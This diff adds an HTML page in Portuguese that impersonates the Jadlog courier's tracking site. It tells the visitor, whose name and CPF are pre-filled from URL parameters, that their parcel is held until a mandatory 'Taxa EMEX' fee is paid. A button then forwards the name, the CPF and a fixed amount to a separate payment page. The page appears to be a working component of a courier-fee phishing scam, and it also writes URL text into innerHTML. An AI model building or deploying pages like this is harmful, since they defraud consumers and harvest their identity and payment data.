@@ -1,0 +1,201 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Jadlog - Rastreamento</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 900px;
+      margin: 50px auto;
+      background: #ffffff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+    .banner {
+      width: 100%;
+      margin-bottom: 20px;
+    }
+    .banner img {
+      width: 100%;
+      height: auto;
+      border-radius: 10px;
+    }
+    .logo {
+      margin-bottom: 20px;
+    }
+    .logo img {
+      max-width: 200px;
+      height: auto;
+    }
+    .user-info {
+      margin-bottom: 20px;
+      font-size: 20px;
+      color: #333;
+      font-weight: bold;
+    }
+    .user-info p {
+      margin: 5px 0;
+    }
+    h3 {
+      color: #333;
+      font-size: 20px;
+      font-weight: bold;
+      margin: 20px 0;
+    }
+    .status {
+      color: #d71920;
+      font-weight: bold;
+      font-size: 24px;
+      margin: 10px 0 20px;
+    }
+    p {
+      color: #555;
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+    .btn {
+      display: inline-block;
+      background: #d71920;
+      color: #fff;
+      padding: 10px 20px;
+      text-align: center;
+      border-radius: 5px;
+      font-size: 16px;
+      font-weight: bold;
+      text-decoration: none;
+      transition: 0.3s;
+      margin: 20px auto;
+    }
+    .btn:hover {
+      background: #b0161a;
+    }
+    .image-container {
+      position: relative;
+      display: inline-block;
+      width: 100%;
+      margin-bottom: 20px;
+    }
+    .image-container img {
+      width: 100%;
+      height: auto;
+    }
+    .z_texto {
+      position: absolute;
+      top: 58%;
+      left: 22%;
+      color: rgba(179, 0, 0, 0.9);
+      font-size: 12px;
+      padding: 8px 12px;
+      text-align: left;
+    }
+    .nome-fixado {
+      position: absolute;
+      top: 45%;
+      left: 15%;
+      font-size: 12px;
+      font-weight: bold;
+      color: #111;
+      padding: 4px 8px;
+      border-radius: 4px;
+    }
+    .cpf-fixado {
+      position: absolute;
+      top: 52%;
+      left: 22%;
+      font-size: 14px;
+      font-weight: bold;
+      color: #111;
+      padding: 4px 8px;
+      border-radius: 4px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Banner Superior -->
+    <div class="banner">
+      <img src="images/banner.png" alt="Banner 1">
+    </div>
+    <!-- Logo Jadlog -->
+    <div class="logo">
+      <img src="images/logo1.png" alt="Jadlog Logo">
+    </div>
+    <!-- Informações de Usuário -->
+    <div class="user-info">
+      <p>NOME: <span id="nome-completo">Nome Completo</span></p>
+      <p>CPF: <span id="cpf">000.000.000-00</span></p>
+    </div>
+    <!-- Conteúdo Principal -->
+    <h3>ENCOMENDA: BRL7847KQDN</h3>
+    <div class="status">Encomenda localizada em São Paulo</div>
+    <p>O seu pedido BRL7847KQDN está com pendência de pagamento da <strong>Taxa EMEX</strong>. O pagamento é obrigatório para emissão da Nota Fiscal e despacho do produto.</p>
+    
+    <!-- Imagem + overlays -->
+    <div class="image-container">
+      <img src="images/ChatGPT%20Image%2011_04_2025%2C%2018_14_25.png" alt="Encomenda tributada">
+      <div class="z_texto"><p><b>ENCOMENDA TRIBUTADA</b></p></div>
+      <div class="nome-fixado"><span id="nome-completo-2">Nome Completo</span></div>
+      <div class="cpf-fixado"><span id="cpf-2">000.000.000-00</span></div>
+    </div>
+
+    <p>Solicitamos a gentileza de realizar o pagamento para liberar o envio do seu produto.</p>
+    
+    <!-- Botão de liberação (corrigido) -->
+    <a class="btn" id="btn-liberacao">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</a>
+    
+    <!-- Banner Inferior -->
+    <div class="banner">
+      <img src="images/banner2.jpg" alt="Banner 2">
+    </div>
+  </div>
+
+  <script>
+    // Função para formatar o CPF no formato 000.000.000-00
+    function formatCPF(cpf) {
+      cpf = cpf.replace(/\D/g, '');
+      if (cpf.length !== 11) return cpf;
+      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      const urlParams = new URLSearchParams(window.location.search);
+      const nome = urlParams.get('nome') || 'Nome Completo';
+      const cpfParam = urlParams.get('cpf') || '00000000000';
+      const cpfFormatado = formatCPF(cpfParam);
+
+      // Atualiza os blocos principais
+      document.getElementById('nome-completo').textContent = nome;
+      document.getElementById('cpf').textContent = cpfFormatado;
+
+      // Atualiza os blocos duplicados na imagem
+      document.getElementById('nome-completo-2').textContent = nome;
+      document.getElementById('cpf-2').textContent = cpfFormatado;
+
+      // Caso nome seja muito extenso, quebra em duas linhas
+      [document.getElementById('nome-completo'), document.getElementById('nome-completo-2')].forEach(el => {
+        if (el) {
+          const nomeTexto = el.textContent.trim();
+          const partes = nomeTexto.split(" ");
+          if (partes.length > 4) {
+            el.innerHTML = partes.slice(0, 4).join(" ") + "<br>" + partes.slice(4).join(" ");
+          }
+        }
+      });
+
+      // 🔥 Ajusta o botão para enviar nome + cpf + value até dados.html
+      const value = 4680; // valor fixo (pode ser dinâmico depois)
+      const novoLink = `../pagamento/dados.html?nome=${encodeURIComponent(nome)}&cpf=${cpfParam}&value=${value}`;
+      document.getElementById("btn-liberacao").setAttribute("href", novoLink);
+    });
+  </script>
+
+
+
+</body></html>
